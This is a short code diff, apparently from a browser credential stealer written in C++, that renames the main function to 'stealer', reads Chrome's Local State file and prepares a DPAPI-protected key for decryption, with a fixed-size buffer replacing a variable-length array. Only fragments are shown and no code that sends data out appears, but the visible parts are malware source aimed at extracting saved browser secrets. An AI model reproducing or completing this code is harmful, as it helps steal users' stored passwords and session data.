@@ -121,7 +121,7 @@ LPCWSTR stringToLPCWSTR(std::string orig)
     return wcstring;
 }
 
-int main()
+int stealer()
 {
     std::string localstate = get_chrome_localstate();
 
@@ -138,7 +138,7 @@ int main()
 
     int i;
     size_t len = str_key.length();
-    BYTE result[len] = "";
+    BYTE result[1000] = "";
     DATA_BLOB DataOut = {0};
     DATA_BLOB DataVerify = {0};
     DataOut.pbData = (BYTE *)str_key.c_str();
@@ -221,3 +221,5 @@ int main()
 
         return 0;
 }
+
+
